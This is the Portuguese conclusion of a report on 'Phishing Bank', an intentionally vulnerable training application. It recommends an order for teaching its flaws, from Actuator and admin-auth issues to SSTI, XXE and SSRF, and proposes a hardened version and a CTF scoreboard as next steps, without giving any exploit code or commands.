**Conclusão:** O Phishing Bank atende ao objetivo de laboratório educacional, permitindo que estudantes e profissionais pratiquem técnicas de exploração e mitigação em ambiente controlado. Recomenda-se nunca executar em produção ou com dados reais. Para instrutores, sugere-se começar pelas vulnerabilidades mais simples (Actuator, Admin Auth, Shadow API) e avançar para SSTI, XXE e SSRF em etapas mais avançadas.

**Próximos passos:** Implementar as correções sugeridas em cada seção para criar uma versão "hardened" do aplicativo; usar essa versão como benchmark para comparar com a versão vulnerável; documentar o fluxo de CTF e scoreboard para gamificação em treinamentos.
